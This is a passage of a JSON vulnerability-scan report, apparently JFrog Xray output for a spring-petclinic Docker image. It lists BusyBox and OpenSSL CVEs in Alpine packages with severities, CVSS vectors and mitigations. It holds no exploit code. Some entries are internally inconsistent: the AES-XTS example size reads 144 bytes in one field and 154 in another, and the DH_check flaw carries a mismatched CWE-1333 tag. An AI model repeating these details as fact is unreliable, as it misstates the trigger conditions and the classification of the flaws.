                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Busybox applets are usually run as standalone (forked) processes and thus a DoS will have a minimal effect",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-42376",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-190221",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A NULL pointer dereference in Busybox's hush applet leads to denial of service when processing a crafted shell command, due to missing validation after a \\x03 delimiter character. This may be used for DoS under very rare conditions of filtered command input.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "1.16.0-r0 ≤ Version ≤ 1.33.1-r8"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42376",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A NULL pointer dereference in Busybox's hush applet leads to denial of service when processing a crafted shell command, due to missing validation after a \\x03 delimiter character. This may be used for DoS under very rare conditions of filtered command input.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190221",
            "VulnerabilityTitle": "",
            "ShortDescription": "A NULL pointer dereference in Busybox hush leads to denial of service when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA NULL pointer dereference in `hush` leads to denial of service when processing a crafted shell command, due to missing validation after a `\\x03` delimiter character. This may be used for DoS under very rare conditions of filtered command input.\nAn attacker that controls `hush` command line arguments can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_HUSH=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Busybox applets are usually run as standalone (forked) processes and thus a DoS will have a minimal effect",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-42376",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-515312",
         "severity": "Medium",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: The AES-XTS cipher decryption implementation for 64 bit ARM\nplatform contains a bug that could cause it to read past the input buffer,\nleading to a crash.\n\nImpact summary: Applications that use the AES-XTS algorithm on the 64 bit ARM\nplatform can crash in rare circumstances. The AES-XTS algorithm is usually\nused for disk encryption.\n\nThe AES-XTS cipher decryption implementation for 64 bit ARM platform will read\npast the end of the ciphertext buffer if the ciphertext size is 4 mod 5 in 16\nbyte blocks, e.g. 144 bytes or 1024 bytes. If the memory after the ciphertext\nbuffer is unmapped, this will trigger a crash which results in a denial of\nservice.\n\nIf an attacker can control the size and location of the ciphertext buffer\nbeing decrypted by an application using AES-XTS on 64 bit ARM, the\napplication is affected. This is fairly unlikely making this issue\na Low severity one.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.1.0-r4"
            ],
            "fixed_versions": [
               "3.1.0-r4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-1255",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: The AES-XTS cipher decryption implementation for 64 bit ARM\nplatform contains a bug that could cause it to read past the input buffer,\nleading to a crash.\n\nImpact summary: Applications that use the AES-XTS algorithm on the 64 bit ARM\nplatform can crash in rare circumstances. The AES-XTS algorithm is usually\nused for disk encryption.\n\nThe AES-XTS cipher decryption implementation for 64 bit ARM platform will read\npast the end of the ciphertext buffer if the ciphertext size is 4 mod 5 in 16\nbyte blocks, e.g. 144 bytes or 1024 bytes. If the memory after the ciphertext\nbuffer is unmapped, this will trigger a crash which results in a denial of\nservice.\n\nIf an attacker can control the size and location of the ciphertext buffer\nbeing decrypted by an application using AES-XTS on 64 bit ARM, the\napplication is affected. This is fairly unlikely making this issue\na Low severity one.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-515312",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds read in OpenSSL 3.x may lead to denial of service in 64 bit ARM platforms when decrypting AES-XTS cipher data.",
            "FullDescription": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\n[AES-XTS](https://www.cast-inc.com/security/encryption-primitives/aes-xts) is a mode of operation for the AES symmetric encryption algorithm designed explicitly for encrypting data on storage devices. It combines the XEX construction and the Tweakable Block Cipher concept to provide confidentiality and data integrity.\n\nA bug was identified in the OpenSSL decryption implementation of the AES-XTS cipher for 64-bit ARM systems, which, when triggered, could result in a crash due to reading beyond the input buffer if the overflow memory is not mapped.\n\nThe ciphertext length must be `4 modulu 5`, meaning a size that leaves a remainder of 4 when divided by 5.\nFor example: 154 bytes, 1024 bytes.\n\nThis issue only affects 64-bit ARM systems (`aarch64`).",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "No PoC exists that triggers the issue and exploitation requires a solid understanding of cryptography principles and techniques.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The issue only applies to 64-bit ARM systems (`aarch64`) and for applications that use `AES-XTS`.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must control the buffer size of the ciphertext being decrypted, which is highly unlikely.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official OpenSSL Advisory",
                  "Url": "https://www.openssl.org/news/vulnerabilities.html#CVE-2023-1255",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=bc2f61ad70971869b242fc1cb445b98bad50074a",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-1255",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-515312",
         "severity": "Medium",
         "jfrog_severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: The AES-XTS cipher decryption implementation for 64 bit ARM\nplatform contains a bug that could cause it to read past the input buffer,\nleading to a crash.\n\nImpact summary: Applications that use the AES-XTS algorithm on the 64 bit ARM\nplatform can crash in rare circumstances. The AES-XTS algorithm is usually\nused for disk encryption.\n\nThe AES-XTS cipher decryption implementation for 64 bit ARM platform will read\npast the end of the ciphertext buffer if the ciphertext size is 4 mod 5 in 16\nbyte blocks, e.g. 144 bytes or 1024 bytes. If the memory after the ciphertext\nbuffer is unmapped, this will trigger a crash which results in a denial of\nservice.\n\nIf an attacker can control the size and location of the ciphertext buffer\nbeing decrypted by an application using AES-XTS on 64 bit ARM, the\napplication is affected. This is fairly unlikely making this issue\na Low severity one.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.1.0-r4"
            ],
            "fixed_versions": [
               "3.1.0-r4"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-1255",
                     "cwe": [
                        "CWE-125"
                     ],
                     "cwe_details": {
                        "CWE-125": {
                           "name": "Out-of-bounds Read",
                           "description": "The product reads data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "7"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: The AES-XTS cipher decryption implementation for 64 bit ARM\nplatform contains a bug that could cause it to read past the input buffer,\nleading to a crash.\n\nImpact summary: Applications that use the AES-XTS algorithm on the 64 bit ARM\nplatform can crash in rare circumstances. The AES-XTS algorithm is usually\nused for disk encryption.\n\nThe AES-XTS cipher decryption implementation for 64 bit ARM platform will read\npast the end of the ciphertext buffer if the ciphertext size is 4 mod 5 in 16\nbyte blocks, e.g. 144 bytes or 1024 bytes. If the memory after the ciphertext\nbuffer is unmapped, this will trigger a crash which results in a denial of\nservice.\n\nIf an attacker can control the size and location of the ciphertext buffer\nbeing decrypted by an application using AES-XTS on 64 bit ARM, the\napplication is affected. This is fairly unlikely making this issue\na Low severity one.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-515312",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bounds read in OpenSSL 3.x may lead to denial of service in 64 bit ARM platforms when decrypting AES-XTS cipher data.",
            "FullDescription": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\n[AES-XTS](https://www.cast-inc.com/security/encryption-primitives/aes-xts) is a mode of operation for the AES symmetric encryption algorithm designed explicitly for encrypting data on storage devices. It combines the XEX construction and the Tweakable Block Cipher concept to provide confidentiality and data integrity.\n\nA bug was identified in the OpenSSL decryption implementation of the AES-XTS cipher for 64-bit ARM systems, which, when triggered, could result in a crash due to reading beyond the input buffer if the overflow memory is not mapped.\n\nThe ciphertext length must be `4 modulu 5`, meaning a size that leaves a remainder of 4 when divided by 5.\nFor example: 154 bytes, 1024 bytes.\n\nThis issue only affects 64-bit ARM systems (`aarch64`).",
            "Impact": 4,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "No PoC exists that triggers the issue and exploitation requires a solid understanding of cryptography principles and techniques.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The issue only applies to 64-bit ARM systems (`aarch64`) and for applications that use `AES-XTS`.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must control the buffer size of the ciphertext being decrypted, which is highly unlikely.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Official OpenSSL Advisory",
                  "Url": "https://www.openssl.org/news/vulnerabilities.html#CVE-2023-1255",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official Patch",
                  "Url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=bc2f61ad70971869b242fc1cb445b98bad50074a",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-1255",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-608052",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. One of those\nchecks confirms that the modulus ('p' parameter) is not too large. Trying to use\na very large modulus is slow and OpenSSL will not normally use a modulus which\nis over 10,000 bits in length.\n\nHowever the DH_check() function checks numerous aspects of the key or parameters\nthat have been supplied. Some of those checks use the supplied modulus value\neven if it has already been found to be too large.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulernable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the '-check' option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.1.1-r3"
            ],
            "fixed_versions": [
               "3.1.1-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-3446",
                     "cwe": [
                        "CWE-1333"
                     ],
                     "cwe_details": {
                        "CWE-1333": {
                           "name": "Inefficient Regular Expression Complexity",
                           "description": "The product uses a regular expression with an inefficient, possibly exponential worst-case computational complexity that consumes excessive CPU cycles."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. One of those\nchecks confirms that the modulus ('p' parameter) is not too large. Trying to use\na very large modulus is slow and OpenSSL will not normally use a modulus which\nis over 10,000 bits in length.\n\nHowever the DH_check() function checks numerous aspects of the key or parameters\nthat have been supplied. Some of those checks use the supplied modulus value\neven if it has already been found to be too large.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulernable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the '-check' option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-3446",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-608052",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. One of those\nchecks confirms that the modulus ('p' parameter) is not too large. Trying to use\na very large modulus is slow and OpenSSL will not normally use a modulus which\nis over 10,000 bits in length.\n\nHowever the DH_check() function checks numerous aspects of the key or parameters\nthat have been supplied. Some of those checks use the supplied modulus value\neven if it has already been found to be too large.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulernable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the '-check' option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.1.1-r3"
            ],
            "fixed_versions": [
               "3.1.1-r3"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-3446",
                     "cwe": [
                        "CWE-1333"
                     ],
                     "cwe_details": {
                        "CWE-1333": {
                           "name": "Inefficient Regular Expression Complexity",
                           "description": "The product uses a regular expression with an inefficient, possibly exponential worst-case computational complexity that consumes excessive CPU cycles."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. One of those\nchecks confirms that the modulus ('p' parameter) is not too large. Trying to use\na very large modulus is slow and OpenSSL will not normally use a modulus which\nis over 10,000 bits in length.\n\nHowever the DH_check() function checks numerous aspects of the key or parameters\nthat have been supplied. Some of those checks use the supplied modulus value\neven if it has already been found to be too large.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulernable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the '-check' option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-3446",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-608014",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack\n\nImpact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.\n\nA file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.\n\nOpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().\n\nWe have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.1.4-r5"
            ],
            "fixed_versions": [
               "3.1.4-r5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-0727",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack\n\nImpact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.\n\nA file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.\n\nOpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().\n\nWe have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-0727",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-608014",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack\n\nImpact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.\n\nA file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.\n\nOpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().\n\nWe have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.1.4-r5"
            ],
            "fixed_versions": [
               "3.1.4-r5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-0727",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Issue summary: Processing a maliciously formatted PKCS12 file may lead OpenSSL\nto crash leading to a potential Denial of Service attack\n\nImpact summary: Applications loading files in the PKCS12 format from untrusted\nsources might terminate abruptly.\n\nA file in PKCS12 format can contain certificates and keys and may come from an\nuntrusted source. The PKCS12 specification allows certain fields to be NULL, but\nOpenSSL does not correctly check for this case. This can lead to a NULL pointer\ndereference that results in OpenSSL crashing. If an application processes PKCS12\nfiles from an untrusted source using the OpenSSL APIs then that application will\nbe vulnerable to this issue.\n\nOpenSSL APIs that are vulnerable to this are: PKCS12_parse(),\nPKCS12_unpack_p7data(), PKCS12_unpack_p7encdata(), PKCS12_unpack_authsafes()\nand PKCS12_newpass().\n\nWe have also fixed a similar issue in SMIME_write_PKCS7(). However since this\nfunction is related to writing data we do not consider it security significant.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
